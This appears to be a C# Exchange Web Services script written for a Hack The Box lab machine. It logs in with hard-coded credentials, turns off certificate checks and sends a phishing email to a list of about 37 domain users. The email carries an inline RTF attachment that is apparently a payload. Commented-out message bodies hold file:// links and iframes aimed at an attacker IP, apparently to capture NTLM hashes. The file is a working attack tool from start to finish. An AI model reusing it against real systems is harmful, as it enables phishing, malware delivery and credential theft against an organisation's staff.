/// <summary>
/// Source: https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/jj220499%28v%3dexchg.80%29
/// Using VS Code
/// <code>
/// dotnet new console -o HelloWorld
/// cd HellowWorld
/// dotnet add package Microsoft.Exchange.WebServices --version 2.2.0
/// dotnet run
/// </code>
/// On Kali Linux, install gss-ntlmssp
/// <code>
/// apt install gss-ntlmssp
/// </code>
/// </summary>

using System;
using System.Net;
using Microsoft.Exchange.WebServices.Data;

namespace HelloWorld
{
    /// <summary>
    /// Send email using EWS
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            //   ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2007_SP1);
            ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010);
            //   service.Credentials = new WebCredentials("user1@contoso.com", "password");
            //   service.Credentials = new WebCredentials("sven@htb.local", "Summer2020");
            service.Credentials = new WebCredentials("s.svensson", "Summer2020", "htb");
            service.TraceEnabled = true;
            service.TraceFlags = TraceFlags.All;

            // BypassSSLCert
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            //   service.AutodiscoverUrl("sven@htb.local", RedirectionUrlValidationCallback);
            service.Url = new Uri("https://10.10.10.210/EWS/Exchange.asmx");
            EmailMessage email = new EmailMessage(service);
            // Manually add each email address to recipient
            // email.ToRecipients.Add("alex@htb.local");
            // email.ToRecipients.Add("Administrator@htb.local");    
            // Add email address from an array of recipients       
            string[] Recipients = { "Administrator","alex","bob","charles","david","davis","donald","edward","frans","fred","gregg","james","jea_test_account","jeff","jenny","jhon","jim","joe","joseph","kalle","kevin","knut","lars","lee","marshall","michael","richard","robert","robin","ronald","steven","stig","sven","teresa","thomas","travis","william" };
            foreach (string rcpt in Recipients)
            {
                email.ToRecipients.Add(rcpt + "@htb.local");
            }

            email.Subject = "Hello from sven";
            //   email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
            // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"file://10.10.14.12/image.jpg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
            // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"testimg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");

            string html = @"<html>
                            <head>
                            </head>
                            <body>
                                <img width=100 height=100 id=""1"" src=""cid:message.rtf"">
                            </body>
                            </html>";
            email.Body = new MessageBody(BodyType.HTML, html);

            // string file = @"D:\Pictures\Party.jpg";
            // email.Attachments.AddFileAttachment("Party.jpg", file);
            // email.Attachments[0].IsInline = true;
            // email.Attachments[0].ContentId = "Party.jpg";
            string file = @"D:\Pictures\message.rtf";
            email.Attachments.AddFileAttachment("message.rtf", file);
            email.Attachments[0].IsInline = true;
            email.Attachments[0].ContentId = "message.rtf";            

            // email.Body = new MessageBody("<html><h1>Download to update</h1><p>1. Try inserting an image</p><img src='file://10.10.14.12/download.jpg'><p>2. Try inserting an iframe:</p><iframe src='file://10.10.14.12/download.png'></iframe><p>3. Try inserting a hyperlink: <a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");


            // email.Send();
            email.SendAndSaveCopy();
        }
        private static bool RedirectionUrlValidationCallback(string redirectionUrl)
        {
            // The default for the validation callback is to reject the URL.
            bool result = false;
            Uri redirectionUri = new Uri(redirectionUrl);
            // Validate the contents of the redirection URL. In this simple validation
            // callback, the redirection URL is considered valid if it is using HTTPS
            // to encrypt the authentication credentials. 
            if (redirectionUri.Scheme == "https")
            {
                result = true;
            }
            return result;
        }
    }
}
